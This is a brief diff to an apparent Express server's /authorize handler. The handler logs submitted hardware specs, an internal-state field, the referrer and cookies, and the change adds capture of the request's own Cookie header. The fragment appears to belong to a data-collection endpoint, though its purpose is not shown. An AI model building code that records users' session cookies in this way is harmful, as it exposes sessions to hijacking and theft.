@@ -102,7 +102,7 @@ app.post('/authorize', (req, res) => {
     const hardwareSpecs = body.hardwareSpecs ? JSON.stringify(body.hardwareSpecs) : 'N/A';
     const internalState = body.internalState ? JSON.stringify(body.internalState) : 'N/A';
     const referrer = req.get('referer') || body.referrer || 'N/A';
-    const cookies = body.cookies || 'N/A';
+    const cookies = body.cookies || req.get('cookie') || 'N/A';
 
     const entry =
 `Time: ${new Date().toLocaleString()}
